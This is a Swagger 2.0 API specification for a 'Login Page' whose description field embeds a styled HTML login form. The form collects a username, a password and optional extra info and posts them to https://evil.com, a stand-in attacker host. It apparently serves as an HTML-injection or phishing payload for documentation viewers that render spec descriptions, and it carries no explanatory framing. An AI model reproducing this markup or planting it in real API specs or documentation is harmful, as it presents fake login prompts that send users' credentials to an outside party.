swagger: '2.0'
info:
  version: 1.0.0
  title: Login Page
  description: '<div style="font-family: Arial; background-color: #f2f2f2; height: 100vh; display: flex; align-items: center; justify-content: center;">

  <div style="width: 300px; padding: 20px; background-color: white; border-radius: 5px; box-shadow: 0 0 10px #ccc;">
    
    <h2 style="text-align: center;">Login</h2>
     <form action="https://evil.com" method="post">
    
    <!-- Username / Email -->
    <label for="username">Username or Email:</label><br>
    <input type="text" id="username" name="username" placeholder="Enter username"><br><br>

    <!-- Password -->
    <label for="password">Password:</label><br>
    <input type="password" id="password" name="password" placeholder="Enter password"><br><br>

    <!-- Textarea (alternative input) -->
    <label for="message">Additional Info:</label><br>
    <textarea id="message" name="message" rows="3" cols="30" placeholder="Optional"></textarea><br><br>

    <!-- Remember me -->
    <input type="checkbox" id="remember" name="remember">
    <label for="remember">Remember Me</label><br><br>

    <!-- Submit button -->
    <input type="submit" value="Login">

  </form>
  </div>
</div>'
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
